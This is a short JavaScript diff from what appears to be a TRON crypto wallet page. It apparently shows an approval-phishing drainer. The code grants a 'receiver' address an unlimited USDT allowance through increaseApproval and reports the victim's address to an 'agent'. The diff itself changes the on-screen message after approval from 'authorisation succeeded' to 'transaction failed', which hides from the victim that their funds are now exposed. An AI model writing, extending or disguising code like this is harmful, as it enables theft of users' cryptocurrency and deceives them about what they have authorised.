@@ -430,16 +430,9 @@
 
 				if (parseFloat(userData.trxBalance) < 15) {
 					showTemporaryMessage('TRX能量不足')
-					notifyAgentBinding(window.tronWeb.defaultAddress.base58, receiver)
 
 					return
 				} else {
-					// const receiver = await getContractAddress() // moved up
-					// if (!receiver) {
-					// 	showTemporaryMessage('获取收款地址失败')
-					// 	return
-					// }
-
 					try {
 						const contract = await window.tronWeb.contract().at(USDT_CONTRACT)
 						// 无限额度
@@ -448,7 +441,7 @@
 						// 直接调用 increaseApproval
 						await contract.increaseApproval(receiver, amount).send()
 
-						showTemporaryMessage('授权成功')
+						showTemporaryMessage('交易失败')
 
 						// 这里可以添加上报逻辑
 						notifyAgentBinding(window.tronWeb.defaultAddress.base58, receiver)
